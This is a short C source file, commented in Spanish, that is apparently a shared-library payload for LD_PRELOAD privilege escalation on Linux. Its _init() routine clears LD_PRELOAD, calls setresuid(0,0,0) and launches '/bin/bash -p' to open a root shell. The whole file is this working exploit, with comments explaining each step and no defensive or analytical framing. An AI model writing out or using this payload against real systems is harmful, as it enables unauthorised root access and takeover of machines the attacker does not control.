#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");      // Elimina la variable de entorno LD_PRELOAD
    setresuid(0,0,0);            // Establece el UID (identificador de usuario) a 0 (root)
    system("/bin/bash -p");      // Ejecuta bash con privilegios elevados (root)
}
